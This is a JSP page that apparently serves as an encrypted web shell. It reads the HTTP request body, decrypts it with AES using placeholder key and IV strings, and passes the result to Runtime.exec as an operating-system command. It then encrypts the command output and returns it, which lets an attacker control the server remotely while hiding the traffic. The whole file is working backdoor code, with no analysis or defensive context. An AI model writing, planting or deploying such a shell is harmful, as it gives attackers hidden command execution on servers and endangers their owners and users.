<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="javax.crypto.SecretKey" %>
<%@ page import="javax.crypto.spec.IvParameterSpec" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@ page import="java.io.*" %>
<%@ page import="java.security.spec.AlgorithmParameterSpec" %>
<%@ page import="java.util.Base64" %>
<% request.setCharacterEncoding("utf-8"); %>
<%!
    public static String encrypt(final String plaintext) {
        try {
            SecretKey key = new SecretKeySpec("[key_placeholder]".getBytes(), "AES");
            AlgorithmParameterSpec iv = new IvParameterSpec("[iv_placeholder]".getBytes());
            // 指定加密的算法、工作模式和填充方式
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, key, iv);
            byte[] result = cipher.doFinal(plaintext.getBytes("UTF-8"));
            return Base64.getEncoder().encodeToString(result);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    public static String decrypt(final String encrypted) {
        try {
            SecretKey key = new SecretKeySpec("[key_placeholder]".getBytes(), "AES");
            AlgorithmParameterSpec iv = new IvParameterSpec("[iv_placeholder]".getBytes());
            byte[] decodeBase64 = Base64.getDecoder().decode(encrypted);
            // 指定加密的算法、工作模式和填充方式
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, key, iv);
            return new String(cipher.doFinal(decodeBase64), "UTF-8");
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
%>
<%
    try {
        BufferedReader br = request.getReader();
        String str, wholeStr = "";
        while((str = br.readLine()) != null) {
            wholeStr += str + "\n";
        }
		br.close();
		
		
        if(wholeStr != null && !wholeStr.trim().equals("")){
			wholeStr = wholeStr.substring(0,wholeStr.length()-1);
			wholeStr = decrypt(wholeStr);
			InputStream in = Runtime.getRuntime().exec(wholeStr.split(",",3)).getInputStream();
			ByteArrayOutputStream baos = new ByteArrayOutputStream();
			byte[] buffer = new byte[1024];
			int len = 0;
			while((len = in.read(buffer)) != -1) {
				baos.write(buffer, 0, len);
			}
			response.getWriter().print(encrypt(baos.toString().trim()));
			out.clearBuffer();
			in.close();
			baos.close();
		}
    } catch (IOException e) {
        System.err.println(e);
    }
%>